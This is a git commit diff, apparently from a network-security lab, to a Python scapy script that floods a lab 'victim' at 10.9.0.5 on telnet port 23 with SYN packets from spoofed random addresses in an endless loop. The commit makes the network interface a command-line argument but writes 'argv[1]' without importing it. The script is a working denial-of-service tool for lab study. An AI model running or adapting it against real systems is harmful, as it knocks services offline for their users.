f234649baed0db24f8def3368e22610831ce5c25
rjofccs <93563397+rjofccs@users.noreply.github.com>
2023-07-03 18:25:33 -0700

    Update synflood.py

--- labs/Lab2/volumes/synflood.py
+++ labs/Lab2/volumes/synflood.py
@@ -2,6 +2,8 @@
 from scapy.all import IP, TCP, send
 from ipaddress import IPv4Address
 from random import getrandbits
+import sys
+print(sys.argv)
 ip = IP(dst="10.9.0.5")      # victim
 tcp = TCP(dport=23, flags='S')      # 23 for telnet
 pkt = ip/tcp
@@ -9,4 +11,4 @@ while True:
       pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
       pkt[TCP].sport = getrandbits(16) # source port
       pkt[TCP].seq = getrandbits(32) # sequence number
-      send(pkt, iface = 'br-3cba7ed65b16' , verbose = 0)   # br-3cba7ed65b16
+      send(pkt, iface = argv[1] , verbose = 0)   # br-3cba7ed65b16
